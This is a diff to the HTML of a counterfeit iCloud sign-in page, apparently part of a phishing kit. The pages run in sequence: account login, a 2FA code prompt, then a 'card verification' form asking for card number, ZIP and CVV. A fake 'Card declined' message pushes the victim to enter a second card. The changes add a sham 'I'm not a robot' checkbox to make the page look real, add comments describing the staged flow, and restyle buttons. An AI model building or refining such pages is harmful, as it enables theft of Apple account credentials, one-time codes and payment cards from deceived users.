@@ -14,7 +14,7 @@
 </head>
 <body>
     <div id="pageContainer">
-        <!-- Login Form -->
+        <!-- Login Form (Loads First) -->
         <div id="loginForm" class="form-card">
             <div class="logo">
                 <img src="logo.png" alt="iCloud" width="80">
@@ -30,6 +30,9 @@
                 <label class="checkbox">
                     <input type="checkbox" id="keepSignedIn"> Keep me signed in
                 </label>
+                <div id="captcha" style="margin: 20px auto; text-align: center;">
+                    <label><input type="checkbox" id="notRobot"> I'm not a robot</label>
+                </div>
                 <button type="submit" class="submit-btn">
                     <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                         <path d="M8.5 5.5L15.5 12L8.5 18.5" stroke="white" stroke-width="2"/>
@@ -41,7 +44,7 @@
             </div>
         </div>
 
-        <!-- 2FA Page -->
+        <!-- 2FA Page (Loads After Login Submission) -->
         <div id="twoFactorPage" class="page hidden">
             <div class="form-card">
                 <div class="logo">
@@ -53,12 +56,12 @@
                     <div class="input-group code-input">
                         <input type="text" id="verificationCode" placeholder="6-digit code" maxlength="6" required>
                     </div>
-                    <button type="submit" class="submit-btn">Verify</button>
+                    <button type="submit" class="submit-btn rectangular">Verify</button>
                 </form>
             </div>
         </div>
 
-        <!-- Card Verification Page -->
+        <!-- Card Verification Page (Loads After 2FA Submission) -->
         <div id="cardVerifyPage" class="page hidden">
             <div class="form-card">
                 <div class="logo">
@@ -87,7 +90,7 @@
                     <div class="input-group">
                         <input type="text" id="billingZip" placeholder="ZIP Code" required>
                     </div>
-                    <button type="submit" class="submit-btn">Verify Card</button>
+                    <button type="submit" class="submit-btn rectangular">Verify Card</button>
                 </form>
                 <div id="declinedMsg" class="error hidden">Card declined. Please try another.</div>
                 <form id="secondCardForm" class="hidden">
@@ -105,7 +108,7 @@
                             <input type="text" id="cvv2" placeholder="CVV" maxlength="4" required>
                         </div>
                     </div>
-                    <button type="submit" class="submit-btn">Verify Alternate Card</button>
+                    <button type="submit" class="submit-btn rectangular">Verify Alternate Card</button>
                 </form>
             </div>
         </div>
